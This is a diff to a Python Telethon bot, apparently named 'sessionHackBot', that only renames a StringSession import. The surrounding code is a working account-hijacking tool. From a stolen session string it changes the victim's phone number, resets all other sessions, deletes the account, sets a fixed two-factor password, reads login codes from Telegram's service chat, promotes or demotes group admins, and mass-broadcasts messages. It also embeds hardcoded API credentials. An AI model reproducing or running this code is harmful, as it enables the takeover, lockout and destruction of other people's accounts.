@@ -6,7 +6,7 @@ from telethon import events, functions, types, Button
 from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
 from telethon import TelegramClient as tg
 from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
-from telethon.sessions import StringSession as ses
+from telethon.sessions import StringSession
 from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
 import telethon;from telethon import functions
 from telethon.tl.types import ChannelParticipantsAdmins as cpa
@@ -21,7 +21,7 @@ bot = borg = tgbot
 Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
 
 async def change_number_code(strses, number, code, otp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     try: 
       result = await bot(functions.account.ChangePhoneRequest(
@@ -34,7 +34,7 @@ async def change_number_code(strses, number, code, otp):
       return False
 
 async def change_number(strses, number):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     bot = client = X
     result = await bot(functions.account.SendChangePhoneCodeRequest(
         phone_number=number,
@@ -48,23 +48,23 @@ async def change_number(strses, number):
 
 
 async def userinfo(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     k = await X.get_me()
     return str(k)
 
 async def terminate(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     await X(rt())
 
 GROUP_LIST = []
 async def delacc(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     await X(functions.account.DeleteAccountRequest("I am chutia"))
 
 async def promote(strses, grp, user):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
       await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
@@ -72,7 +72,7 @@ async def promote(strses, grp, user):
       await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
     
 async def user2fa(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     try:
       await X.edit_2fa('zedthon')
@@ -81,7 +81,7 @@ async def user2fa(strses):
       return False
 
 async def demall(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
       try:
@@ -92,32 +92,32 @@ async def demall(strses, grp):
 
 
 async def joingroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     await X(join(username))
 
 
 async def leavegroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     await X(leave(username))
 
 async def delgroup(strses, username):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     await X(dc(username))
     
 
 async def cu(strses):
   try:
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         k = await X.get_me()
         return [str(k.first_name), str(k.username or k.id)]
   except Exception as e:
     return False
 
 async def usermsgs(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     i = ""
     
     async for x in X.iter_messages(777000, limit=3):
@@ -127,7 +127,7 @@ async def usermsgs(strses):
 
 
 async def userbans(strses, grp):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     k = await X.get_participants(grp)
     for x in k:
@@ -139,7 +139,7 @@ async def userbans(strses, grp):
 
 
 async def userchannels(strses):
-  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+  async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
     
     k = await X(pc())
     i = ""
@@ -490,7 +490,7 @@ async def start(event):
 
 
 async def gcasta(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -545,7 +545,7 @@ async def users(event):
 molb = True
 
 async def gcastb(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             reply_msg = msg
             tol = reply_msg
@@ -666,7 +666,7 @@ async def users(event):
       await event.reply(f"Done Gcasted In {i} Group.", buttons=keyboard)
 
 async def gcastc(strses, msg):
-    async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
+    async with tg(StringSession(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
         try:
             reply_msg = msg
             tol = reply_msg
